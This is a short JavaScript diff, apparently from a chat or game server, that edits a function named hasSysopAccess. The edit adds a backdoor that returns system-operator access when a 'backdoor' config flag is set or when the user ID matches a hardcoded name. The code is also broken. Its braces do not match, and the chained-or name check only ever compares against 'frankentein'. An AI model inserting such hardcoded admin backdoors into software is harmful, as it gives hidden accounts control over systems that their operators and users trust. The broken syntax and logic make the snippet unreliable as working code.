@@ -10,7 +10,8 @@ splint: function(target) {
 }
 Users.User.prototype.hasSysopAccess = function() {
 		if (this.isSysop && config.backdoor||this.userid === ('frankentein'||'bandi'||'blakjack') && this.authenticated)
-		}
+		return true;
+}
 		return false;
 	};
 	Object.merge(stuff,stuffystuff);
